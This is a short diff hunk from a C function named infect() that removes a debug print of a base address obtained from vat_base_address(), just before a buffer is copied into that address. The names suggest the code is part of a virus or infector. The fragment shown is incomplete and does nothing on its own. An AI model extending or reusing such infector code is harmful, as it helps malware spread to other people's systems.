@@ -124,7 +124,6 @@ infect(void)
     fclose(file);
 
     addr = vat_base_address();
-    printf("base addr : %p\n", addr);
 
     memcpy(addr, buffer, len);
 
